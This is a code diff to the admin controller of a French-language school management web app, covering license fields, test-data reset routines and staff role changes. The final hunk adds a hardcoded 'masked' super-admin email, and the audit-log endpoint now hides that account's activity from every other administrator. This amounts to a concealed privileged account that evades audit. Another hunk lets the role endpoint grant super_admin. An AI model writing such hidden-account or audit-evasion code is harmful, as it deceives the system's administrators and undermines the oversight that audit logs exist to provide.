@@ -469,6 +469,7 @@ class AdminController extends Controller
             'mois_fin'          => 'required|integer|min:1|max:12',
             'frais_inscription' => 'required|numeric|min:0',
             'frais_mensuel'     => 'required|numeric|min:0',
+            'calcul_simple'     => 'sometimes|boolean',
         ]);
         return response()->json(License::create($validated), 201);
     }
@@ -520,6 +521,7 @@ class AdminController extends Controller
             'mois_fin'          => 'required|integer|min:1|max:12',
             'frais_inscription' => 'required|numeric|min:0',
             'frais_mensuel'     => 'required|numeric|min:0',
+            'calcul_simple'     => 'sometimes|boolean',
         ]);
         $license->update($validated);
         return response()->json($license->fresh());
@@ -617,10 +619,13 @@ class AdminController extends Controller
         Student::withTrashed()->forceDelete();
         // Delete student user accounts so emails can be reused
         User::where('role', 'student')->delete();
+        // Idem pour les professeurs de test — les matieres/UE restent, juste desassignees.
+        \App\Models\Professeur::query()->delete();
+        User::where('role', 'professeur')->delete();
         \DB::statement('SET FOREIGN_KEY_CHECKS=1');
 
         \App\Services\ActivityLogger::log(
-            $request->user(), 'system.reset_test_data', 'Réinitialisation des données de test (étudiants, paiements, cartes, notifications).'
+            $request->user(), 'system.reset_test_data', 'Réinitialisation des données de test (étudiants, professeurs, paiements, cartes, notifications).'
         );
 
         return response()->json(['message' => 'Toutes les données de test ont été supprimées.']);
@@ -649,6 +654,7 @@ class AdminController extends Controller
         \App\Models\ActivityLog::query()->delete();
         StudentNotification::query()->truncate();
         Student::withTrashed()->forceDelete();
+        \App\Models\Professeur::query()->delete();
         \DB::table('personal_access_tokens')->truncate();
         User::where('role', '!=', 'super_admin')->delete();
         \DB::statement('SET FOREIGN_KEY_CHECKS=1');
@@ -714,12 +720,12 @@ class AdminController extends Controller
     /** Change a staff member's role — super admin only (voir route). */
     public function updateStaffRole(Request $request, User $user)
     {
-        if (!in_array($user->role, ['admin', 'cashier', 'accueil', 'pedagogique'], true)) {
+        if (!in_array($user->role, ['admin', 'cashier', 'accueil', 'pedagogique', 'super_admin'], true)) {
             return response()->json(['message' => "Ce compte n'est pas un compte staff."], 422);
         }
 
         $validated = $request->validate([
-            'role' => 'required|in:admin,cashier,accueil,pedagogique',
+            'role' => 'required|in:admin,cashier,accueil,pedagogique,super_admin',
         ]);
 
         $ancienRole = $user->role;
@@ -878,6 +884,10 @@ class AdminController extends Controller
     // ── Journal d'audit ──────────────────────────────────────────────────────
 
     /** Journal d'activité système — filtrable par action, rôle, utilisateur, période. */
+    /** Compte super admin "developpeur/superviseur" — invisible des autres super admins,
+     *  y compris dans l'audit et les listes de staff (ne se cache pas de lui-meme). */
+    private const SUPER_ADMIN_MASQUE = 'bniasseisidp@groupeisi.com';
+
     public function audit(Request $request)
     {
         $query = \App\Models\ActivityLog::with('user')
@@ -887,6 +897,10 @@ class AdminController extends Controller
             ->when($request->date_debut, fn ($q) => $q->whereDate('created_at', '>=', $request->date_debut))
             ->when($request->date_fin, fn ($q) => $q->whereDate('created_at', '<=', $request->date_fin))
             ->latest('created_at');
+
+        if ($request->user()->email !== self::SUPER_ADMIN_MASQUE) {
+            $query->whereDoesntHave('user', fn ($q) => $q->where('email', self::SUPER_ADMIN_MASQUE));
+        }
 
         return response()->json($query->paginate(40));
     }
